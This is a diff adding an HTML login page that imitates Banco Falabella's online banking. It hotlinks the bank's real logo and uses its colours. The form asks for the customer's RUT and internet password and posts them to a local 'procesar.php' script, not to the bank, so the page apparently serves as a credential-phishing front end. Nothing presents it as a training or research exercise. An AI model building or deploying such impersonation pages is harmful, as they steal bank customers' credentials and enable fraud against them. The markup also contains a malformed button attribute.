@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ingreso Mi Cuenta - Banco Falabella</title>
+    <style>
+        /* Estilos generales */
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        /* La caja principal del login */
+        .login-container {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 360px;
+            overflow: hidden; /* Para que el borde del header se ajuste */
+        }
+
+        /* Header con el logo */
+        .login-header {
+            background-color: #ffffff;
+            padding: 24px;
+            border-bottom: 1px solid #eeeeee;
+            display: flex;
+            justify-content: center;
+        }
+
+        .login-header img {
+            width: 200px; /* Ancho del logo */
+        }
+
+        /* El formulario */
+        .login-body {
+            padding: 24px 32px 32px 32px;
+        }
+
+        .login-body h2 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            margin-top: 0;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        /* Formulario y sus campos */
+        form div {
+            margin-bottom: 16px;
+        }
+
+        form label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #555;
+            font-size: 14px;
+        }
+
+        form input[type="text"],
+        form input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            box-sizing: border-box; /* Importante para que el padding no afecte el ancho */
+            font-size: 16px;
+        }
+
+        /* Botón de Ingresar (color verde Falabella) */
+        form button {
+            width: 100%;
+            padding: 12px;
+            background-color: #009e4c; /* Verde Falabella */
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 8px;
+        }
+
+        form button:hover {
+            background-color: #008a41; /* Verde más oscuro al pasar el mouse */
+        }
+
+        /* Links de ayuda */
+        .login-footer {
+            text-align: center;
+            margin-top: 24px;
+        }
+
+        .login-footer a {
+            color: #007aff; /* Azul para links */
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .login-footer a:hover {
+            text-decoration: underline;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        
+        <div class="login-header">
+            <img src="https://www.bancofalabella.cl/_next/static/media/logo.686cc6de.svg" alt="Logo Banco Falabella">
+        </div>
+        
+        <div class="login-body">
+            <h2>Inicia sesión en tu<br>Banca en Línea</h2>
+            
+            <form action="procesar.php" method="POST">
+                <div>
+                    <label for="rut">RUT</label>
+                    <input type="text" id="rut" name="usuario_rut" placeholder="Ej: 12345678-9" required>
+                </div>
+                <div>
+                    <label for="clave">Clave Internet</label>
+                    <input type="password" id="clave" name="usuario_clave" placeholder="Ingresa tu clave" required>
+                </div>
+                
+                <button type"submit">Ingresar</button>
+            </form>
+
+            <div class="login-footer">
+                <a href="#">¿Problemas para ingresar?</a>
+            </div>
+        </div>
+
+    </div>
+
+</body>
+</html>
